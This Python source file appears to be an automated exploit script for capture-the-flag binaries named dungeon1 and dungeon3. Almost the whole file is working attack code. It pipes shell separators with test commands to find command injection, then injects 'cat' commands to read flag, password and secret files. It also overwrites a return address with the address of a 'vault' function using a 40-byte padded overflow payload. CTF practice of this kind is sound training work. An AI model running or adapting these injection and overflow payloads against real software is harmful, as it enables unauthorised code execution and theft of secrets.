#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Objective: Automatically detect and exploit Command Injection and Buffer Overflow vulnerabilities in binary (ELF) files.
# Tools Used: subprocess (for running GDB), re (for output analysis), Pwntools (for payload preparation).

import subprocess
import os
import re
from pwn import *

def execute_command(cmd):
    """Executes shell commands and captures the output. Critical for capturing errors during the exploit process."""
    try:
        print(f"\n[INFO] Executing command: {cmd}")
        # subprocess.check_output runs the command via shell and captures stdout.
        # stderr is redirected to stdout, allowing errors (e.g., Segmentation Fault) to be caught.
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
        print(f"[OUTPUT] Command output: {result.strip()}")
        return result
    except subprocess.CalledProcessError as e:
        # Catches the output in case of a program crash (e.g., Segmentation Fault).
        print(f"[ERROR] Command failed with output: {e.output.decode('utf-8', errors='ignore')}")
        return e.output.decode('utf-8', errors='ignore')
    except subprocess.TimeoutExpired:
        print("[ERROR] Command timed out.")
        return "TIMEOUT"

def execute_payload(binary_name, payload_path):
    """Injects the payload from a file into the target binary via pipe (|)."""
    cmd = f'cat {payload_path} | ./{binary_name}'
    return execute_command(cmd)

def check_injection(binary_name):
    """
    Tests the binary for common command injection vulnerabilities using common delimiters.
    Returns the successful symbol if a vulnerability is found.
    """
    # Common command separators and operators used in CTFs and real systems.
    symbols = ["|", "$(", "`", "&&", ";"] 
    
    for symbol in symbols:
        # Test payload: 'symbol echo VULNERABLE [second symbol]'
        # If the binary executes 'echo VULNERABLE', command injection is confirmed.
        payload = f"{symbol} echo VULNERABLE {symbol if symbol != '|' else ''}"
        
        # The payload is piped as input to the binary.
        output = execute_command(f'echo "{payload}" | ./{binary_name}') 
        
        if 'VULNERABLE' in output:
            print(f"[SUCCESS] Command injection vulnerability found with payload: {payload}")
            return symbol
    
    print("[INFO] No obvious command injection vulnerability found. Proceeding with advanced techniques.")
    return None

def fuzz_binary(binary_name, injection_symbol):
    """Attempts to access sensitive files (flag, password) using the discovered injection symbol."""
    files = ['flag.txt', 'password.txt', 'secret.txt']
    
    for file in files:
        # Exploit payload: constructs the command 'injection_symbol cat flag.txt'.
        payload = f"{injection_symbol} cat {file} {injection_symbol if injection_symbol != '|' else ''}" if injection_symbol else f"cat {file}"
        
        output = execute_command(f'echo "{payload}" | ./{binary_name}')
        
        if output and output != "TIMEOUT":
            # Success is determined if the output does not contain standard errors like 'No such file or directory' or 'sh: '.
            if "No such file or directory" not in output and not output.lower().startswith('sh:'):
                print(f"[SUCCESS] Sensitive data found with payload: {payload}")
                print(f"[OUTPUT] Output: {output.strip()}")
                return True
    
    print("[INFO] Flag not found using simple file enumeration.")
    return False

def analyze_functions(binary_name):
    """Uses GDB to list all functions in the binary (without relying on external static analysis)."""
    try:
        # Runs GDB in quiet mode (-q) to load the file, execute 'info functions', and exit.
        output = subprocess.check_output(["gdb", "-q", "-ex", f"file {binary_name}", "-ex", "info functions", "-ex", "quit"]).decode() 
        # Uses Regex to capture only the function names from the GDB output (e.g., <vault>, <gate>).
        functions = re.findall(r'0x[0-9a-fA-F]+ <(\w+)>', output) 
        return functions
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Error analyzing functions: {e.output.decode('utf-8', errors='ignore')}")
        return []

def get_function_address(binary_name, function_name):
    """Uses GDB to find the memory address of the target function (e.g., 'vault'), crucial for the Return Address overwrite."""
    try:
        # Sends the 'info address [function name]' command to GDB.
        output = subprocess.check_output(["gdb", "-q", "-ex", f"file {binary_name}", "-ex", f"info address {function_name}", "-ex", "quit"]).decode() 
        # Captures the memory address starting with 0x from the output.
        match = re.search(r'0x[0-9a-fA-F]+', output) 
        if match:
            return match.group(0)
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Error getting function address: {e.output.decode('utf-8', errors='ignore')}")
    return None

def buffer_overflow_exploit(binary_name):
    """Exploits Buffer Overflow by overwriting the Return Address with the 'vault' function address using a manually determined offset."""
    
    # Step 1: Find the target function address
    vault_address = get_function_address(binary_name, "vault") 
    if vault_address is None:
        print("[FAIL] Buffer Overflow exploit failed: 'vault' function not found.")
        return

    # Step 2: Prepare Offset and Payload
    # Offset determined manually via Stack Analysis (GDB-PEDA) for the Dungeon3 challenge:
    # 32 bytes local buffer + 8 bytes saved RBP (Base Pointer) = 40 bytes.
    offset = 40  
    
    # Payload structure: (Junk Data/Padding) + (New Return Address)
    # p64() function: Uses Pwntools to convert the address to 64-bit Little-Endian format (reversed byte order).
    payload = b"A" * offset + p64(int(vault_address, 16)) 

    print(f"[INFO] Payload length: {len(payload)}")
    print(f"[INFO] Vault function address: {vault_address}")

    # Step 3: Write Payload to a file
    payload_path = "payload.txt"
    with open(payload_path, "wb") as f:
        f.write(payload)

    # Step 4: Automatically execute the exploit
    print("[ACTION] Running the exploit...")
    os.system(f'cat {payload_path} | ./{binary_name}')
    print("[SUCCESS] Exploit run. Check program output for success message/flag.")


def analyze_binary(binary_name):
    """The main analysis logic, flowing from Command Injection check to Buffer Overflow attempt."""
    injection_symbol = check_injection(binary_name)
    
    if injection_symbol:
        # If an injection vulnerability is found: Try to exploit it first. If no flag is found, proceed to Buffer Overflow.
        if not fuzz_binary(binary_name, injection_symbol): 
            print("[INFO] No flag found with Command Injection. Trying Buffer Overflow...")
            buffer_overflow_exploit(binary_name)
    else:
        # If no injection vulnerability is found: Proceed directly to Buffer Overflow analysis.
        print("[INFO] No Command Injection found. Trying Buffer Overflow...")
        buffer_overflow_exploit(binary_name)

def main():
    """Main function managing the user interface and binary selection."""
    while True:
        choice = input("Which binary do you want to analyze? (1 for dungeon1, 2 for dungeon3, q to quit): ")
        if choice == '1':
            binary_name = "dungeon1"
        elif choice == '2':
            binary_name = "dungeon3"
        elif choice.lower() == 'q':
            print("Exiting.")
            break
        else:
            print("Invalid choice. Please enter 1, 2, or q.")
            continue

        if not os.path.exists(binary_name):
            print(f"Error: {binary_name} not found in the current directory.")
            continue

        analyze_binary(binary_name)

if __name__ == "__main__":
    main()
